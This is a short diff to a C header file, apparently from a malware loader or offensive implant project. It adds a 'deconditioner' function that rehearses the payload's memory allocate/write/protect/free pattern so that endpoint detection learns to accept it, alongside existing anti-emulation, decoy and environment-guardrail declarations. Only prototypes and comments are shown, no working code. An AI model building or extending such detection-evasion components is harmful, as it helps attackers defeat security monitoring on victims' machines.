@@ -31,6 +31,10 @@ void antiemulation(void);
 // Decoy: Executes benign activity to mislead behavioral analysis.
 void decoy(void);
 
+// Deconditioner: Rehearses the carrier's alloc/write/protect/free pattern
+// with benign data to normalize EDR behavioral baselines.
+void deconditioner(void);
+
 // Guardrail: Checks execution environment.
 // Returns 0 if safe to run, non-zero if we should bail.
 int guardrail(void);
